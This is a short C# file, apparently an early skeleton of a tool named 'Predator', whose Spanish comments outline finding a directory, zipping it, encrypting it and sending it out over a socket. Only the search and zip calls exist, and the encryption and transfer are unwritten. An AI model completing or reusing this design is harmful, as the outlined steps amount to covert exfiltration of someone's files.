using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Predator.Components
{
    internal class ServiceWork
    {
        public void InitService() {
        
            //Primero hay que escanear hasta encontrar el directorio
            FilesManager fm = new FilesManager();
            string pathDirectory = fm.SearchDirectory();

            //Luego cuando lo encuentre, hay que empezar a mover el directorio al ZIP
            string pathTempZip = fm.CopyToZip(pathDirectory);

            //Luego, vamos a encriptar la carpeta

            //Luego pasar el directorio al SOCKET
        }

        public void RestoreInit() { }
    }
}
